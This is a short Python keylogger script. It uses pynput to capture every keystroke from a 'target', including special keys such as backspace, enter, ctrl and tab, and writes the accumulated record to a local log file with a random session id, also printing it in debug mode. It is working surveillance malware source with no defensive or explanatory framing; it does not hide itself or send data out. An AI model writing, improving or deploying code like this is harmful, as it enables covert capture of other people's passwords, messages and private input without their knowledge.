# import keyboard
from pynput import keyboard
import random
import datetime

dat = "" # Holds all the data from target input
dbg = True # Wether or not its on debug mode
log = True # Wether or not it will generate logs
id = 0 # If logs are enabled (default yes) this will hold the ID generated on script start

def on_run(): # Generates the (hopefully) unique id for this session
    global id
    global dat
    id = random.randint(1000,99999)
    id += random.randint(1, 200000)
    dat += str(datetime.datetime.now()) + '\n \n' # Labels the log inside the file based on date and time.

def on_press(key): # Logs inputs to dat using pynput
    global dat
    try:
        dat += str(key.char)
    except AttributeError:
        if str(key) == 'Key.space':
            # print(str(key))
            dat += ' '
        if str(key) == 'Key.backspace':
            dat += '/backspace/'
        if str(key) == 'Key.enter':
            dat += '/enter/ \n \n'
        if str(key) == 'Key.alt':
            dat += '/alt/'
        if str(key) == 'Key.ctrl':
            dat += '/ctrl/'
        if str(key) == 'Key.tab':
            dat += '/tab/'
    if dbg:
        print(dat)
    if log:
        generate_log()
        
def generate_log(): # Generates the log text file using built in functionality
    name = 'log' + str(id) + '.txt'
    with open(name, 'w') as f:
        f.write(dat)

on_run()

with keyboard.Listener(
    on_press=on_press) as listener:
    listener.join()
listener = keyboard.Listener(
    on_press=on_press)
listener.start()





# Yea no the keyboard library wont work without root on linux. 
# while True:
#     e = keyboard.read_event()
#     if e.event_type == 'down':
#         print(e.name + 'test')

